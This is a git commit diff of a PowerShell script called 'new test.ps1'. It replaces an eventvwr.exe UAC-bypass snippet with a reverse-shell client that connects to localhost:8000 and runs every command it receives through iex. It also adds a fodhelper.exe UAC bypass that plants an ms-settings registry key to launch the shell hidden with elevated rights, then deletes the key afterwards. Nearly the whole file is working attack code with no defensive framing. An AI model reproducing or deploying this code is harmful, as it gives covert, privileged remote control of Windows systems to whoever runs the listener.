c5f1d7a0d0f9e17b0a98c71723588fb5f5bb94f1
noamz1 <32007964+noamz1@users.noreply.github.com>
2017-10-02 20:54:41 +0300

    Update new test.ps1

--- new test.ps1
+++ new test.ps1
@@ -1,11 +1,66 @@
-  powershell
- $wscript = new-object -ComObject WScript.Shell;
-$hkey = ‘HKCU\Software\Classes\mscfile\shell\open\command\’;
- $sleep = 3000;
- $wscript.RegWrite($hkey);
- Start-Sleep -m $sleep;
- Start-Process -WindowStyle hidden -FilePath ‘eventvwr.exe’; 
- Start-Sleep -m $sleep;
- $wscript.RegDelete($hkey);
-$process = Get-Process $name -ErrorAction silentlycontinue;
-  catch{write-host $_.Exception.Message;}
+
+$client2 = {
+     $address = 'localhost'
+    $port = 8000
+ 
+    while ($true) {
+        do {
+            try {
+                #Write-Host "Trying to reach "$address":"$port
+                $client = New-Object System.Net.Sockets.TcpClient($address, $port) 
+                $stream = $client.GetStream()
+                $writer = New-Object System.IO.StreamWriter($stream)
+                $reader = New-Object System.IO.StreamReader($stream)
+                break
+            }
+            catch {
+                Start-Sleep -s 10
+            }
+        } while ($true)
+   
+        #Write-Host "Connected"
+        # Execute commands sent by the server, and return output
+        try {
+            do {
+                $cmd = $reader.ReadLine()
+                if ($cmd -eq 'exit') {
+                    #Write-Host "Exiting"
+                    break
+                }
+               try {
+                    $output = [string](iex $cmd)
+                }
+                catch {
+                    $output = $_.Exception.Message
+                }
+                $writer.WriteLine($output)
+                $writer.Flush()
+            } while($true)
+        }
+        catch {
+            #Write-Host $_.Exception.Message
+        }
+   
+        # Cleanup
+        $writer.Close()
+        $reader.Close()
+        $stream.Close()
+        $client.Close()
+        }}
+
+
+
+$program = powershell.exe -windowstyle hidden $client2
+
+
+ #Create registry structure
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+
+    #Perform the bypass
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+    #Remove registry structure
+    Start-Sleep 3
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
